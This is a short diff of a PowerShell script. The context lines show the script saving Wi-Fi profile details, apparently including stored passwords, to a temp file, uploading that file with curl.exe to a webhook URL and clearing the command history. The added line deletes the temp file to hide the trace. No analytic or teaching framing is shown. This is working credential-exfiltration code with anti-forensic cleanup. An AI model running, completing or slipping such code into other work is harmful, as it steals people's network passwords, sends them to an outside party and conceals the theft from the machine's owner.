@@ -41,4 +41,5 @@ $wifiProfileDetailsArray | Out-File -FilePath "$env:TEMP\WiFiPasswords.txt"
 curl.exe -F "file1=@$env:TEMP\WiFiPasswords.txt" $webhook_url
 
 # Clear command history
+RI $env:TEMP\WiFiPasswords.txt
 Clear-History
